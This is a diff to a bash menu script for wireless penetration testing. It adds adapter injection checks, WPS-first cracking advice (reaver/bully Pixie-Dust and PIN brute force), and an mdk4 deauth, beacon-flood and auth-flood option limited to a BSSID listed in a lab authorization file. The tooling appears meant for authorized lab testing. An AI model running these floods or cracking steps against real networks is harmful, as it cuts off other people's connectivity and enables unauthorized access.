@@ -26,6 +26,12 @@ MON_IFACE=""
 KISMET_ENABLED=false
 KISMET_PID=""
 
+# Populated by get_authorized_target() from LAB_AUTHORIZATION.md's scope
+# table -- the single BSSID/SSID a DoS/resilience test run is allowed to
+# touch.
+TARGET_SSID=""
+TARGET_BSSID=""
+
 c_green="\e[32m"; c_yellow="\e[33m"; c_red="\e[31m"; c_cyan="\e[36m"; c_bold="\e[1m"; c_reset="\e[0m"
 
 mkdir -p "$LOG_DIR" "$CAPTURES_DIR"
@@ -115,6 +121,7 @@ CHIPSET_BAD_PATTERNS=(
 check_adapter_chipset() {
   echo -e "${c_bold}Adapter / chipset pre-flight check${c_reset}"
   echo "-------------------------------------------------------------"
+  local found_good=0 found_bad=0
   if ! command -v lsusb >/dev/null 2>&1; then
     echo -e "${c_yellow}lsusb not found (usbutils not installed) -- skipping USB chipset ID.${c_reset}"
   else
@@ -123,7 +130,6 @@ check_adapter_chipset() {
     echo -e "${c_cyan}USB devices:${c_reset}"
     echo "$lsusb_out" | sed 's/^/  /'
     echo
-    local found_good=0 found_bad=0
     local pattern line
     for pattern in "${CHIPSET_GOOD_PATTERNS[@]}"; do
       while IFS= read -r line; do
@@ -153,6 +159,8 @@ check_adapter_chipset() {
   fi
 
   echo
+  local iw_list_out=""
+  local have_monitor=0
   if ! command -v iw >/dev/null 2>&1; then
     echo -e "${c_red}[x] iw not found -- cannot verify monitor-mode support. Run sudo ./install.sh.${c_reset}"
   else
@@ -160,14 +168,48 @@ check_adapter_chipset() {
     iw dev 2>/dev/null | sed 's/^/  /'
     echo
     echo -e "${c_cyan}Monitor-mode support (iw list):${c_reset}"
-    local iw_list_out
     iw_list_out="$(iw list 2>/dev/null)"
     if echo "$iw_list_out" | grep -qi "monitor"; then
       echo -e "  ${c_green}[+] At least one wiphy advertises monitor mode support.${c_reset}"
+      have_monitor=1
     else
       echo -e "  ${c_red}[x] No wiphy on this system advertises monitor mode support.${c_reset}"
       echo "      Either the driver isn't loaded correctly or the chipset genuinely lacks it -- check 'dmesg | tail -50'."
     fi
+  fi
+
+  echo
+  echo -e "${c_cyan}Frequency band support:${c_reset}"
+  if [[ -z "$iw_list_out" ]]; then
+    echo "  Unknown (iw list unavailable)."
+  else
+    local has_24=0 has_5=0
+    echo "$iw_list_out" | grep -Eq '\* 2[34][0-9]{2}(\.[0-9])? MHz' && has_24=1
+    echo "$iw_list_out" | grep -Eq '\* 5[0-9]{3}(\.[0-9])? MHz' && has_5=1
+    if (( has_24 == 1 )); then
+      echo -e "  ${c_green}[+] 2.4GHz supported.${c_reset}"
+    else
+      echo "  2.4GHz: not advertised."
+    fi
+    if (( has_5 == 1 )); then
+      echo -e "  ${c_green}[+] 5GHz supported (dual-band adapter).${c_reset}"
+    else
+      echo "  5GHz: not advertised (2.4GHz-only adapter, e.g. AR9271)."
+    fi
+  fi
+
+  echo
+  echo -e "${c_cyan}Packet injection support:${c_reset}"
+  if (( have_monitor == 0 )); then
+    echo -e "  ${c_red}[x] No monitor mode -> no injection possible.${c_reset}"
+  elif (( found_bad == 1 )); then
+    echo -e "  ${c_yellow}[!] Monitor mode advertised, but chipset is on the known-flaky list -- injection may still fail. Verify with: aireplay-ng --test <mon-iface>.${c_reset}"
+  elif (( found_good == 1 )); then
+    echo -e "  ${c_green}[+] Monitor mode advertised on a known-good chipset -- injection is very likely to work.${c_reset}"
+    echo "      Confirm on this specific unit with: aireplay-ng --test <mon-iface>."
+  else
+    echo -e "  ${c_yellow}[!] Monitor mode advertised but chipset unverified -- injection support unknown.${c_reset}"
+    echo "      Confirm with: aireplay-ng --test <mon-iface> (needs the interface already in monitor mode)."
   fi
   echo "-------------------------------------------------------------"
 }
@@ -360,19 +402,25 @@ check_monitor_mode() {
 # tells you which of the already-installed tools is actually applicable.
 recommend_tool_for() {
   local category="$1" wps="$2"
+
+  # WPS takes priority regardless of the underlying encryption category:
+  # Reaver/Bully's Pixie-Dust/PIN attacks against the WPS registrar are
+  # almost always faster than a handshake/PMKID-based approach, and both
+  # tools are already installed via install.sh.
+  if [[ "$wps" == "yes" ]]; then
+    echo "WPS enabled -- reaver/bully (via Airgeddon's WPS menu) recommended: try Pixie-Dust first, fall back to online PIN brute force. Falls back to the ${category} recommendation below if WPS is locked out or fails."
+    return
+  fi
+
   case "$category" in
     WEP)
-      echo "Airgeddon (dedicated WEP attack menu: chopchop/fragmentation/ARP-replay) or Wifite2 (fully automated WEP handling) -- both fine."
+      echo "aircrack-ng suite recommended: Airgeddon's WEP menu (chopchop/fragmentation/ARP-replay via aireplay-ng, key recovery via aircrack-ng) or Wifite2's fully automated WEP handling -- both wrap the same aircrack-ng toolchain."
       ;;
     OPEN)
       echo "No key to attack -- nothing for Airgeddon/Wifite2 to do here beyond passive recon."
       ;;
     WPA2)
-      if [[ "$wps" == "yes" ]]; then
-        echo "WPS is enabled: Airgeddon's Reaver/Bully Pixie-Dust menu is usually fastest. Otherwise Wifite2 (automated handshake+PMKID capture, hands off to hashcat)."
-      else
-        echo "Wifite2 recommended: automates handshake + PMKID capture and hashcat cracking with the least interaction. Airgeddon if you want manual control over which deauth/capture step runs."
-      fi
+      echo "Wifite2 recommended: automates handshake + PMKID capture and hashcat cracking with the least interaction. Airgeddon if you want manual control over which deauth/capture step runs."
       ;;
     WPA2/WPA3-mixed)
       echo "Airgeddon recommended: it has WPA3-aware menus for mixed-mode APs. PMF may already be enabled even in mixed mode, so try the PMKID/hcxdumptool-based capture path before deauth-based handshake capture."
@@ -469,6 +517,161 @@ scan_and_recommend() {
   rm -f "${tmp_prefix}"*.csv "${tmp_prefix}"*.cap "${tmp_prefix}"*.kismet.* "${tmp_prefix}"*.log.csv 2>/dev/null
   echo
   echo "Reminder: only scan/target BSSIDs listed in LAB_AUTHORIZATION.md."
+  pause
+}
+
+# ---------------- scoped DoS / resilience test (mdk4) ----------------
+# Wraps mdk4's existing deauth, beacon-flood, and auth-flood modes --
+# no new attack logic -- but every invocation is hard-restricted to the
+# single BSSID/SSID recorded in LAB_AUTHORIZATION.md's scope table, and
+# refuses outright if that table doesn't have exactly one target picked.
+get_authorized_target() {
+  TARGET_SSID=""
+  TARGET_BSSID=""
+  if [[ ! -f "$AUTH_FILE" ]]; then
+    echo -e "${c_red}[x] LAB_AUTHORIZATION.md not found.${c_reset}"
+    return 1
+  fi
+
+  local candidates=()
+  local line essid bssid
+  while IFS='|' read -r _ essid bssid _rest; do
+    essid="$(echo "${essid:-}" | xargs)"
+    bssid="$(echo "${bssid:-}" | xargs)"
+    [[ -n "$bssid" ]] || continue
+    [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
+    candidates+=("${essid}|${bssid}")
+  done < <(awk '/^## 2\. Scope/{flag=1; next} /^## 3\./{flag=0} flag' "$AUTH_FILE" | grep '^|' | tail -n +3)
+
+  if (( ${#candidates[@]} == 0 )); then
+    echo -e "${c_red}[x] No specific BSSID recorded in LAB_AUTHORIZATION.md's scope table.${c_reset}"
+    echo "    Fill in section 2 (SSID + BSSID, e.g. AA:BB:CC:DD:EE:FF) before running DoS/resilience tests."
+    echo "    Refusing to run an untargeted flood/deauth."
+    return 1
+  elif (( ${#candidates[@]} == 1 )); then
+    IFS='|' read -r TARGET_SSID TARGET_BSSID <<< "${candidates[0]}"
+  else
+    echo "Multiple authorized targets found in the scope table -- pick exactly one for this DoS/resilience test:"
+    local i=1 c
+    for c in "${candidates[@]}"; do
+      IFS='|' read -r essid bssid <<< "$c"
+      printf "  %d) %s (%s)\n" "$i" "${essid:-<no SSID>}" "$bssid"
+      i=$((i+1))
+    done
+    local pick
+    read -rp "Choice: " pick
+    if ! [[ "$pick" =~ ^[0-9]+$ ]] || (( pick < 1 || pick > ${#candidates[@]} )); then
+      echo -e "${c_red}[x] Invalid selection.${c_reset}"
+      return 1
+    fi
+    IFS='|' read -r TARGET_SSID TARGET_BSSID <<< "${candidates[$((pick-1))]}"
+  fi
+  return 0
+}
+
+# Best-effort channel lookup so beacon-flood/deauth can pin to the
+# target's actual channel instead of hopping across the whole band.
+# Returns empty (not a failure) if it can't be determined.
+get_target_channel() {
+  local iface="$1" bssid="$2"
+  command -v airodump-ng >/dev/null 2>&1 || { echo ""; return; }
+  local tmp="/tmp/boc_chan_$$"
+  timeout 6 airodump-ng --bssid "$bssid" --output-format csv -w "$tmp" "$iface" >/dev/null 2>&1
+  local csv="${tmp}-01.csv"
+  local chan=""
+  if [[ -f "$csv" ]]; then
+    chan="$(awk -F',' -v b="$bssid" 'index(toupper($1),toupper(b)){gsub(/ /,"",$4); print $4; exit}' "$csv" 2>/dev/null)"
+  fi
+  rm -f "${tmp}"*.csv "${tmp}"*.cap "${tmp}"*.kismet.* "${tmp}"*.log.csv 2>/dev/null
+  echo "$chan"
+}
+
+launch_dos_test() {
+  echo -e "${c_bold}Scoped DoS / resilience test (mdk4)${c_reset}"
+  echo "-------------------------------------------------------------"
+  echo "Wraps mdk4's own deauth / beacon-flood / auth-flood modes, restricted"
+  echo "to the single target recorded in LAB_AUTHORIZATION.md."
+  echo
+  if ! command -v mdk4 >/dev/null 2>&1; then
+    echo -e "${c_red}[x] mdk4 not found. Run sudo ./install.sh first.${c_reset}"
+    pause
+    return
+  fi
+  if ! get_authorized_target; then
+    pause
+    return
+  fi
+  echo -e "${c_green}[+] Target locked to: ${TARGET_SSID:-<no SSID>} (${TARGET_BSSID})${c_reset}"
+
+  local iface
+  read -rp "Monitor-mode interface [${MON_IFACE:-none set}]: " iface
+  iface="${iface:-$MON_IFACE}"
+  if [[ -z "$iface" ]]; then
+    echo -e "${c_red}[x] No interface given. Use option 2 first to enable monitor mode.${c_reset}"
+    pause
+    return
+  fi
+
+  echo -e "${c_yellow}This will actively disrupt connectivity for ${TARGET_BSSID} -- only proceed against your own authorized test AP.${c_reset}"
+  local confirm_bssid
+  read -rp "Type the target BSSID (${TARGET_BSSID}) to confirm and proceed: " confirm_bssid
+  if [[ "$confirm_bssid" != "$TARGET_BSSID" ]]; then
+    echo -e "${c_red}[x] Confirmation did not match the target BSSID. Aborting.${c_reset}"
+    pause
+    return
+  fi
+
+  echo
+  echo "  1) Deauth / disassoc flood   (mdk4 mode d, -a ${TARGET_BSSID})"
+  echo "  2) Beacon flood              (mdk4 mode b, SSID fixed to '${TARGET_SSID:-<none set>}')"
+  echo "  3) Auth flood                (mdk4 mode a, -a ${TARGET_BSSID})"
+  echo "  0) Back"
+  local dchoice
+  read -rp "Choice: " dchoice
+  [[ "$dchoice" == "0" || -z "$dchoice" ]] && return
+
+  if [[ "$dchoice" == "2" && -z "$TARGET_SSID" ]]; then
+    echo -e "${c_red}[x] Beacon flood needs an SSID and LAB_AUTHORIZATION.md's scope row for this BSSID has none set. Aborting.${c_reset}"
+    pause
+    return
+  fi
+
+  local dur
+  read -rp "Duration in seconds [30]: " dur
+  dur="${dur:-30}"
+  if ! [[ "$dur" =~ ^[0-9]+$ ]]; then
+    dur=30
+  fi
+
+  local channel
+  channel="$(get_target_channel "$iface" "$TARGET_BSSID")"
+
+  case "$dchoice" in
+    1)
+      if [[ -n "$channel" ]]; then
+        run_and_log "mdk4-deauth" timeout "$dur" mdk4 "$iface" d -a "$TARGET_BSSID" -c "$channel"
+      else
+        run_and_log "mdk4-deauth" timeout "$dur" mdk4 "$iface" d -a "$TARGET_BSSID"
+      fi
+      ;;
+    2)
+      if [[ -n "$channel" ]]; then
+        run_and_log "mdk4-beaconflood" timeout "$dur" mdk4 "$iface" b -n "$TARGET_SSID" -c "$channel"
+      else
+        run_and_log "mdk4-beaconflood" timeout "$dur" mdk4 "$iface" b -n "$TARGET_SSID"
+      fi
+      ;;
+    3)
+      if [[ -n "$channel" ]]; then
+        run_and_log "mdk4-authflood" timeout "$dur" mdk4 "$iface" a -a "$TARGET_BSSID" -c "$channel"
+      else
+        run_and_log "mdk4-authflood" timeout "$dur" mdk4 "$iface" a -a "$TARGET_BSSID"
+      fi
+      ;;
+    *)
+      echo "Invalid choice."
+      ;;
+  esac
   pause
 }
 
@@ -569,6 +772,7 @@ while true; do
   echo " 9) Adapter / chipset pre-flight check"
   echo "10) Scan target + WPA3-aware tool recommendation"
   printf "11) Toggle Kismet companion mode (currently: %s)\n" "$([[ "$KISMET_ENABLED" == "true" ]] && echo ON || echo OFF)"
+  echo "12) Scoped DoS / resilience test (mdk4, single-target only)"
   echo " 0) Exit"
   echo
   read -rp "Choice: " choice
@@ -584,6 +788,7 @@ while true; do
     9) check_adapter_chipset; pause ;;
     10) scan_and_recommend ;;
     11) toggle_kismet_companion ;;
+    12) launch_dos_test ;;
     0) echo "Bye."; exit 0 ;;
     *) echo "Invalid choice." ; sleep 1 ;;
   esac
